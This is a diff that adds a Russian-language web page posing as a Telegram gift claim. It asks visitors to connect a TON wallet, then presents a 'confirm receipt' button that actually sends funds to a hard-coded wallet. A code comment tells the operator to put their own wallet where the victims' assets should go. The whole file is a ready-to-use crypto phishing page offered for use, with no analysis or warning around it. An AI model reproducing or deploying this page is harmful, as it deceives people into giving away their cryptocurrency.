@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Rewards & Gifts</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #12161c; color: #fff; text-align: center; margin: 0; padding-top: 60px; }
+        .card { background: #1f2937; max-width: 360px; margin: auto; padding: 24px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        h2 { margin-top: 0; color: #f3f4f6; }
+        #gift-title { color: #9ca3af; font-size: 15px; margin-bottom: 20px; }
+        #ton-connect-button { display: flex; justify-content: center; margin: 20px 0; }
+        .btn { background: #3b82f6; color: white; border: none; padding: 14px 20px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .btn:active { background: #2563eb; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🎁 Забрать подарок</h2>
+        <p id="gift-title">Загрузка данных...</p>
+
+        <div id="ton-connect-button"></div>
+
+        <button class="btn" id="claim-btn" style="display:none;" onclick="sendTransaction()">Подтвердить получение</button>
+    </div>
+
+    <script>
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: window.location.origin + '/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-button'
+        });
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const giftName = urlParams.get('gift') || 'Подарок';
+        document.getElementById('gift-title').innerText = `Активация актива: ${giftName}`;
+
+        tonConnectUI.onStatusChange(walletInfo => {
+            if (walletInfo) {
+                document.getElementById('claim-btn').style.display = 'block';
+            }
+        });
+
+        async function sendTransaction() {
+            // СЮДА ВПИШИ СВОЙ КОШЕЛЕК, КУДА ДОЛЖНЫ УЙТИ АКТИВЫ
+            const myWallet = "UQCPPgg85YaM4Yv9PjREap5IXYY8RWXCf47AqUIUToyjgRMh";
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 60,
+                messages: [
+                    {
+                        address: myWallet, 
+                        amount: "50000000" // 0.05 TON на комиссию/тест
+                    }
+                ]
+            };
+
+            try {
+                const result = await tonConnectUI.sendTransaction(transaction);
+                alert("Успешно!");
+            } catch (e) {
+                console.error(e);
+                alert("Ошибка подтверждения транзакции.");
+            }
+        }
+    </script>
+</body>
+</html>
